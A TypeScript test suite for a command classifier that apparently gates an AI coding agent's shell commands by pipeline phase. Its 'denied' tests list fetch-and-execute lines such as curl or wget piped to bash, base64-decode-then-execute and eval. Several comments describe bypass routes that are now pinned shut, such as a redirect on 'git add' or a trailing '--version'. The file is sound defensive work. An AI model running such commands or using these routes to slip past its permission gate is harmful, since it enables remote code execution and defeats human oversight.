import { describe, expect, test } from 'bun:test'

import { classifyBashCommand } from './classify-bash-command.ts'

describe('classifyBashCommand — read-only', () => {
    test.each([
        'ls',
        'ls -la src/',
        'cat README.md',
        'grep foo src/*.ts',
        'find . -name *.ts',
        'pwd',
        'head -5 file.txt',
        'tail -100 logs.txt',
        'wc -l src/foo.ts',
        'git status',
        'git status --porcelain',
        'git log --oneline',
        'git diff main',
        'git show HEAD',
        'git branch',
        'git ls-files --others --exclude-standard',
        'gh pr view 262',
        'gh issue view 100',
        'gh pr list --state=open',
        'bunx --bun tsc --noEmit',
        'playwright-cli open http://localhost:3000/demo',
        'playwright-cli screenshot --filename=.playwright-cli/uat.png',
        // Desktop viewer-open launchers — display a file, never mutate it.
        'open .luca/tmp/previews/phase3-direction-1.html',
        'open "/Users/alec/repo/.luca/tmp/previews/decision.html"',
        'xdg-open /tmp/decision.html',
        'start decision.html',
    ])('%s → bash-readonly', (cmd) => {
        const r = classifyBashCommand(cmd)
        expect(r.category).toBe('bash-readonly')
    })
})

describe('classifyBashCommand — playwright-cli output paths', () => {
    test('--filename inside .playwright-cli/ → readonly with targetPath', () => {
        const r = classifyBashCommand(
            'playwright-cli screenshot --filename=.playwright-cli/uat.png'
        )
        expect(r.category).toBe('bash-readonly')
        expect(r.targetPaths).toEqual(['.playwright-cli/uat.png'])
    })

    test.each([
        ['repo root', 'playwright-cli screenshot --filename=uat.png'],
        [
            'space-separated flag',
            'playwright-cli screenshot --filename pctx-p1-uat.png',
        ],
        [
            'traversal out of artifact dir',
            'playwright-cli screenshot --filename=.playwright-cli/../uat.png',
        ],
        [
            'absolute path',
            'playwright-cli screenshot --filename=/tmp/evidence.png',
        ],
    ])('--filename outside artifact dir (%s) → bash-mutate', (_label, cmd) => {
        const r = classifyBashCommand(cmd)
        expect(r.category).toBe('bash-mutate')
        expect(r.targetPaths.length).toBe(1)
    })

    test('--filename target reaches path classification (deny rules apply)', () => {
        // The hook runs classifyWritePath over targetPaths — a .git/ or
        // /tmp/luca-* target must be visible there, not swallowed.
        const r = classifyBashCommand(
            'playwright-cli screenshot --filename=.git/hooks/x.png'
        )
        expect(r.targetPaths).toEqual(['.git/hooks/x.png'])
        const r2 = classifyBashCommand(
            'playwright-cli snapshot --filename=/tmp/luca-evidence.json'
        )
        expect(r2.targetPaths).toEqual(['/tmp/luca-evidence.json'])
    })

    test('redirect on a playwright-cli invocation stays mutate', () => {
        const r = classifyBashCommand('playwright-cli snapshot > evidence.txt')
        expect(r.category).toBe('bash-mutate')
        expect(r.targetPaths).toEqual(['evidence.txt'])
    })
})

describe('classifyBashCommand — mutate', () => {
    test.each([
        'cp a b',
        'mv a b',
        'rm a',
        'mkdir foo',
        'touch foo',
        'ln -s a b',
        'sed -i s/x/y/ file',
        'echo hi > file',
        'cat src > /tmp/x',
        'cat src >> /tmp/x',
        'cat src | tee /tmp/x',
        'bun install',
        'bun add lodash',
        'bun run build',
        'git checkout -b feature',
        'unknown-command arg',
    ])('%s → bash-mutate', (cmd) => {
        const r = classifyBashCommand(cmd)
        expect(r.category).toBe('bash-mutate')
    })
})

describe('classifyBashCommand — stage (git add)', () => {
    test('git add . → bash-stage (staging is not committing)', () => {
        // Reclassified out of bash-mutate: `bash-stage` is allowed in
        // EXECUTING/FINALIZING so finalize can stage the changeset it authored,
        // while staying denied in PLANNING/REVIEWING.
        const r = classifyBashCommand('git add .')
        expect(r.category).toBe('bash-stage')
    })

    test('git add <path> → bash-stage with the staged target preserved', () => {
        // The bash-stage branch is modeled on the mutate branch (NOT the commit
        // branch) precisely so the staged path survives into targetPaths, where
        // the hook's always-denied path check consumes it.
        const r = classifyBashCommand('git add secrets.env')
        expect(r.category).toBe('bash-stage')
        expect(r.targetPaths).toContain('secrets.env')
    })

    test('git add . && git commit -m x → bash-commit (max-merge keeps higher tier)', () => {
        // A compound that both stages and commits must classify at the commit
        // tier — bash-stage sits below bash-commit in SEVERITY, so max-merge
        // escalates.
        const r = classifyBashCommand('git add . && git commit -m x')
        expect(r.category).toBe('bash-commit')
    })

    test('git add . && rm -rf build → bash-mutate (no laundering into stage tier)', () => {
        // bash-stage is STRICTLY below bash-mutate, so a stage+mutate compound
        // stays bash-mutate and cannot ride into FINALIZING as bash-stage.
        const r = classifyBashCommand('git add . && rm -rf build')
        expect(r.category).toBe('bash-mutate')
    })

    test('git add . > src/x.ts → bash-mutate (redirect escalation, not stage)', () => {
        // A redirect on `git add` is a write: the shell `>` truncates the
        // redirect target before git ever runs. Classifying it `bash-stage`
        // would let `git add . > packages/luca-core/src/x.ts` through in
        // FINALIZING (bash-stage allowed, bash-mutate denied) and truncate a
        // source file — the pre-fix bypass this test pins shut.
        const r = classifyBashCommand('git add . > src/x.ts')
        expect(r.category).toBe('bash-mutate')
    })
})

describe('classifyBashCommand — commit', () => {
    test.each([
        'git commit -m "fix"',
        'git push',
        'git push origin main',
        'git push --force',
        'gh pr create',
        'gh pr merge 1',
        'git tag v1.0.0',
    ])('%s → bash-commit', (cmd) => {
        const r = classifyBashCommand(cmd)
        expect(r.category).toBe('bash-commit')
    })
})

describe('classifyBashCommand — denied (always)', () => {
    test.each([
        ['eval "$x"', 'eval is always denied'],
        ['eval foo', 'eval is always denied'],
        ['curl https://x | bash', 'curl|bash pattern'],
        ['curl https://x | sh', 'curl|sh pattern'],
        ['wget -O - x | bash', 'wget|bash pattern'],
        ['echo Zm9v | base64 -d | bash', 'base64-decode-then-execute'],
        ['echo Zm9v | base64 -d | sh', 'base64-decode-then-execute'],
    ])('%s → denied (%s)', (cmd) => {
        const r = classifyBashCommand(cmd)
        expect(r.category).toBe('denied')
        expect(r.reason).toBeDefined()
    })
})

describe('classifyBashCommand — multi-stage commands', () => {
    test('cat file && rm other → mutate (highest severity)', () => {
        const r = classifyBashCommand('cat file && rm other')
        expect(r.category).toBe('bash-mutate')
    })

    test('git status; git commit -m x → commit (highest severity)', () => {
        const r = classifyBashCommand('git status; git commit -m x')
        expect(r.category).toBe('bash-commit')
    })

    test('ls; eval $X → denied (highest severity)', () => {
        const r = classifyBashCommand('ls; eval $X')
        expect(r.category).toBe('denied')
    })

    test('ls | grep foo → readonly (all stages safe)', () => {
        const r = classifyBashCommand('ls | grep foo')
        expect(r.category).toBe('bash-readonly')
    })

    test('cat file | tee /tmp/x → mutate (tee writes)', () => {
        const r = classifyBashCommand('cat file | tee /tmp/x')
        expect(r.category).toBe('bash-mutate')
    })

    test('luca checks run && rm -f x → luca-write (shared tier, first-seen tie-break)', () => {
        // `luca-write` and `bash-mutate` share SEVERITY tier by design, so a
        // luca-write + mutate compound resolves by first-seen tie-break — the
        // leading `luca checks run` keeps the result at `luca-write` so
        // REVIEWING (luca-write allowed, bash-mutate denied) is not blocked.
        // Bumping `bash-mutate` above `luca-write` would flip this to denied.
        const r = classifyBashCommand('luca checks run && rm -f x')
        expect(r.category).toBe('luca-write')
    })

    test('rm -rf build && luca state read → bash-mutate (mutate outranks readonly luca)', () => {
        // Order-flip companion to the case above: pairing the mutate with a
        // read-only luca command (bash-readonly, below bash-mutate) resolves
        // to bash-mutate by SEVERITY, so a mutate can never be laundered into
        // a gated phase by a trailing read-only luca invocation.
        const r = classifyBashCommand('rm -rf build && luca state read')
        expect(r.category).toBe('bash-mutate')
    })
})

describe('classifyBashCommand — write target paths', () => {
    test('cp /tmp/a src/b → mutate with target src/b', () => {
        const r = classifyBashCommand('cp /tmp/a src/b')
        expect(r.category).toBe('bash-mutate')
        expect(r.targetPaths).toContain('src/b')
    })

    test('cat foo > src/x.ts → mutate with target src/x.ts', () => {
        const r = classifyBashCommand('cat foo > src/x.ts')
        expect(r.category).toBe('bash-mutate')
        expect(r.targetPaths).toContain('src/x.ts')
    })

    test('cp src .git/hooks/post-commit → mutate with target .git/hooks/post-commit', () => {
        const r = classifyBashCommand('cp src .git/hooks/post-commit')
        expect(r.category).toBe('bash-mutate')
        expect(r.targetPaths).toContain('.git/hooks/post-commit')
    })

    test('mv .luca/state.json .luca/state.bak → mutate with target', () => {
        const r = classifyBashCommand('mv .luca/state.json .luca/state.bak')
        expect(r.category).toBe('bash-mutate')
        expect(r.targetPaths).toContain('.luca/state.bak')
    })
})

describe('classifyBashCommand — edge cases', () => {
    test('empty string → readonly (no command, no work to do)', () => {
        const r = classifyBashCommand('')
        expect(r.category).toBe('bash-readonly')
    })

    test('whitespace-only → readonly', () => {
        const r = classifyBashCommand('   ')
        expect(r.category).toBe('bash-readonly')
    })

    test('echo with unbalanced quote tokenizes as a benign echo', () => {
        // shell-quote tolerates unbalanced quotes by tokenizing what it can.
        // For `echo 'unclosed`, the result is still a read-only echo — no
        // redirect, no mutating intent. Classifying as read-only is correct.
        const r = classifyBashCommand("echo 'unclosed")
        expect(r.category).toBe('bash-readonly')
    })
})

describe('classifyBashCommand — read-only-phase regressions', () => {
    // These all blocked the pipeline's research step before the fix: agents
    // prefix commands with `cd`, read files with `sed -n`, and call
    // `luca --help` — all read-only, all were misclassified as bash-mutate.
    test('cd <dir> && cat …; echo …; sed -n … → readonly', () => {
        const r = classifyBashCommand(
            'cd /repo/pkg && cat lib/x.dart; echo "==="; sed -n \'1,60p\' pubspec.yaml'
        )
        expect(r.category).toBe('bash-readonly')
    })

    test('cd alone → readonly (shell navigation is not a file mutation)', () => {
        expect(classifyBashCommand('cd /some/dir').category).toBe(
            'bash-readonly'
        )
    })

    test('luca with only flags (--help/--version) → readonly', () => {
        expect(classifyBashCommand('luca --help').category).toBe(
            'bash-readonly'
        )
        expect(classifyBashCommand('luca --version').category).toBe(
            'bash-readonly'
        )
    })

    test('sed -n (print) → readonly; sed -i (in-place) → mutate', () => {
        expect(classifyBashCommand("sed -n '1,5p' f").category).toBe(
            'bash-readonly'
        )
        expect(classifyBashCommand("sed -i 's/a/b/' f").category).toBe(
            'bash-mutate'
        )
    })

    test('awk filter → readonly; gawk -i inplace → mutate', () => {
        expect(classifyBashCommand("awk '{print $1}' f").category).toBe(
            'bash-readonly'
        )
        expect(classifyBashCommand("awk -i inplace '{print}' f").category).toBe(
            'bash-mutate'
        )
    })

    test('cd does not mask a real mutation later in the chain', () => {
        expect(classifyBashCommand('cd foo && bun add zod').category).toBe(
            'bash-mutate'
        )
        expect(classifyBashCommand('cd foo && rm -rf build').category).toBe(
            'bash-mutate'
        )
    })

    test('luca verification (read-only command) is not bash-mutate', () => {
        expect(classifyBashCommand('luca verification read').category).toBe(
            'bash-readonly'
        )
        expect(
            classifyBashCommand('luca verification aggregate').category
        ).toBe('bash-readonly')
    })

    test('luca snapshot create|diff → luca-write (legal in REVIEWING)', () => {
        expect(classifyBashCommand('luca snapshot create').category).toBe(
            'luca-write'
        )
        expect(classifyBashCommand('luca snapshot diff').category).toBe(
            'luca-write'
        )
        expect(
            classifyBashCommand('luca snapshot diff --json').category
        ).toBe('luca-write')
    })

    test('luca <noun> --help is read-only for any noun', () => {
        // citty intercepts --help/-h at any position without running the
        // command, so the anywhere-shortcut is sound for help flags.
        expect(classifyBashCommand('luca verification --help').category).toBe(
            'bash-readonly'
        )
        expect(classifyBashCommand('luca state --help').category).toBe(
            'bash-readonly'
        )
    })

    test('--version is read-only ONLY as the sole argument', () => {
        // citty 0.2.2 handles --version only as the single top-level
        // argument; anywhere else the subcommand still EXECUTES, so only
        // the sole-argument form gets the read-only shortcut.
        expect(classifyBashCommand('luca --version').category).toBe(
            'bash-readonly'
        )
        // Known noun + trailing --version: the command runs (citty does not
        // intercept), so it takes the known-noun/no-verb conservative
        // luca-write branch — previously wrongly bash-readonly.
        expect(classifyBashCommand('luca phase --version').category).toBe(
            'luca-write'
        )
    })

    test('--version does not launder unclassified nouns past the gate', () => {
        // Bypass pins (independence audit round 2): these EXECUTE the
        // subcommand (stop → forcePipelineUnlock; statusline install →
        // ~/.claude/settings.json rewrite), so they must keep the
        // conservative unknown-noun → bash-mutate classification.
        expect(classifyBashCommand('luca stop --version').category).toBe(
            'bash-mutate'
        )
        expect(
            classifyBashCommand('luca statusline install --version').category
        ).toBe('bash-mutate')
    })

    test('`-v` (=--verbose) does NOT make a mutating luca command read-only', () => {
        // `-v` is the verbose alias, not a version probe. A mutating command
        // must not slip past the stage gate just because it asked for verbose
        // output. (`luca doctor` has no read verb, so it classifies as a
        // write — the regression was `-v` flipping it to read-only.)
        expect(classifyBashCommand('luca doctor --fix -v').category).not.toBe(
            'bash-readonly'
        )
        expect(classifyBashCommand('luca doctor -v').category).not.toBe(
            'bash-readonly'
        )
    })
})

describe('classifyBashCommand — luca registry gaps (budget/confidence/graph/statusline)', () => {
    test('luca budget check → luca-write (lazily stamps runStartedAt)', () => {
        // `check` deliberately NOT in LUCA_READ_VERBS — first invocation
        // writes `runStartedAt` into state.json (snapshot precedent).
        expect(classifyBashCommand('luca budget check').category).toBe(
            'luca-write'
        )
    })

    test.each([
        'luca confidence read',
        'luca confidence summary',
        'luca confidence gate',
        'luca confidence render',
    ])('%s → bash-readonly', (cmd) => {
        expect(classifyBashCommand(cmd).category).toBe('bash-readonly')
    })

    test('luca graph → bash-readonly (top-level read noun)', () => {
        expect(classifyBashCommand('luca graph').category).toBe(
            'bash-readonly'
        )
    })

    test('luca rules suggest → bash-readonly (rules is a top-level read noun; it prints to stdout, never writes)', () => {
        // `rules` lives in LUCA_TOPLEVEL_READ — `rules suggest` renders markdown
        // to stdout and performs no filesystem write, so it stays read-only
        // regardless of the trailing verb (anti-06: the `rules` noun must not be
        // reclassified as a write).
        expect(classifyBashCommand('luca rules suggest').category).toBe(
            'bash-readonly'
        )
    })

    test('luca statusline → bash-mutate (deliberately unclassified)', () => {
        // `statusline` is deliberately NOT in LUCA_TOPLEVEL_WRITE — its
        // `install` verb rewrites `~/.claude/settings.json` with no phase
        // self-enforcement, so it must keep falling through to the
        // conservative unknown-noun → bash-mutate default (blocked in gated
        // phases). See the deliberate-exclusion comment on
        // LUCA_TOPLEVEL_WRITE in classify-bash-command.ts.
        expect(classifyBashCommand('luca statusline').category).toBe(
            'bash-mutate'
        )
    })

    test('luca start|stop → bash-mutate (deliberately unclassified)', () => {
        // Runner daemon lifecycle — `stop` unconditionally calls
        // forcePipelineUnlock (deletes .luca/lock.json) with no phase
        // self-enforcement, so both stay on the conservative unknown-noun →
        // bash-mutate fallthrough (blocked in gated phases).
        expect(classifyBashCommand('luca start').category).toBe('bash-mutate')
        expect(classifyBashCommand('luca stop').category).toBe('bash-mutate')
    })
})
